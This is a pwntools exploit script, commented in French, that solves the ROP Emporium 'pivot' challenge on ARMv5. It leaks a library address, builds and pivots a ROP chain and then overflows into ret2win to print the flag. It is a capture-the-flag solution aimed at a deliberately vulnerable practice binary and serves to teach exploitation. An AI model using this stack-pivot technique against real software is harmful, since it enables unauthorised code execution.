#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# ropemporium ARMv5 soft pivot
# Solution leak puts et rappel pwnme

# Set up pwntools for the correct architecture
# 164 : read
# 148 : ret
gs='''
b *pwnme
b *pwnme+148
c
'''

#context.log_level='debug'
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

elf = context.binary = ELF('pivot_armv5')

# References ELF du programme
main=elf.symbols['main']
useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
puts=elf.symbols['puts']
pwnme=elf.symbols['pwnme']
data = elf.get_section_by_name('.data').header['sh_addr']

# References ELF de la librairie
libelf = ELF('libpivot_armv5.so')

lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold

# ----- Gadgets -----
# pop {r4, pc}
g_pop_r4 = 0x00010760 

#  mov r5, r4 ; mov r4, sp ; mov sp, r5 ; pop {r4, fp, pc} |
g_mov_r45_mov_sp_r5 = 0x000108f0

# pop {r3, pc}; |
g_pop_r3 = 0x000105d4

#  mov r0, r3; sub sp, fp, #4; pop {fp, pc};
g_mov_r0r3 = 0x00010808 

# 0x0001092c: blx r3;
g_blx_r3 = 0x0001092c

# 0x00010984 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
g_pop_r45678 = 0x00010984


# 0x00010810 : pop {fp, pc}
g_pop_fp = 0x00010810

# Mode thumb
# mov lr, r4; adds r3, r7, #0; bx r3;
g_mov_lrr4_bx_r3 = 0x0001091d 

# START

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


# ETAPE 0 : lecture de l'adresse leak
io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
leak = int(leak,16)
log.info(f"got_foothold   = 0x{got_foothold:x}")
log.info(f"leak           = 0x{leak:x}")
log.info(f"adr ret2win    = 0x{lib_ret2win:x}")
log.info(f"adr foothold   = 0x{lib_foothold:x}")
log.info(f"offset ret2win = 0x{off_ret2win:x}")


log.info("ETAPE 1 / message 1")
# ETAPE 1 - Message 1 
# ROP chaine d'exploitation
PL=b''
PL+=p32(0)
PL+=p32(leak+4*14)        # pop fp; ajusté pour mov_r0r3 plus loin
PL+=p32(g_pop_r45678)
PL+=p32(g_pop_r3)         # r4 => lr
PL+=p32(5)                # 
PL+=p32(6)                # 
PL+=p32(plt_foothold)     # => r3
PL+=p32(8)                # 
PL+=p32(9)                # 
PL+=p32(10)               # 
PL+=p32(g_mov_lrr4_bx_r3)

# Apppel de puts 
# pop r0
PL+=p32(got_foothold)     # pour r3 puis r0
PL+=p32(g_mov_r0r3)       # mov r0, r3; sub sp, fp, #4; pop {fp, pc};
PL+=p32(leak+4*26)        # ajuste fp pour le prochain mov_r0r3
# entree 14 
PL+=p32(g_pop_r45678)
PL+=p32(g_pop_r3)         # r4 => lr
PL+=p32(5)                # 
PL+=p32(6)                # 
PL+=p32(puts)             # => r3
PL+=p32(8)                # 
PL+=p32(9)                # 
PL+=p32(10)               # 
PL+=p32(g_mov_lrr4_bx_r3)

PL+=p32(leak)                # pour pop r3

# pop r0
PL+=p32(g_mov_r0r3)
PL+=p32(11)                 # pour fp
# Entree 26
PL+=p32(pwnme)
PL+=p32(plt_foothold)  

io.sendlineafter(b"> ",PL)

log.info("ETAPE 1 / pivot")
# ETAPE 1 - Message 2 : pivot
# Offset avant ecrasement de l'adresse de retour
offset=0x24

PL =b"A"*offset
PL+=p32(g_pop_r4)            # r4 <= leak
PL+=p32(leak)                #
PL+=p32(g_mov_r45_mov_sp_r5) # sp <=leak
io.sendlineafter(b"> ",PL)


# ETAPE INTERMEDIAIRE
# Le puts est effectué on lit l'adresse de foothold.
# Reception du leak puts
io.recvline()
io.recvline()
rep = io.recvline().rstrip()
info(rep.hex())
#leak=u32(rep[:4]+b"\x00\x00")
leak=u32(rep[:4])

# Calcule de l'adresse de ret2win
ret2win = leak+off_ret2win
exit_clean= leak+0x24
info(f"foothold leak = 0x{leak:x}")
info(f"ret2win       = 0x{ret2win:x}")

# ETAPE 2 - Message 1 
# Recoit un LF precedent (?!)
# io.sendline(b"OK")

# ETAPE 2 - Message 2 
# Envoi d'un bourrage de debordement 
PL =b"A"*(offset)
PL+=p32(ret2win)
PL+=p32(exit_clean)
io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

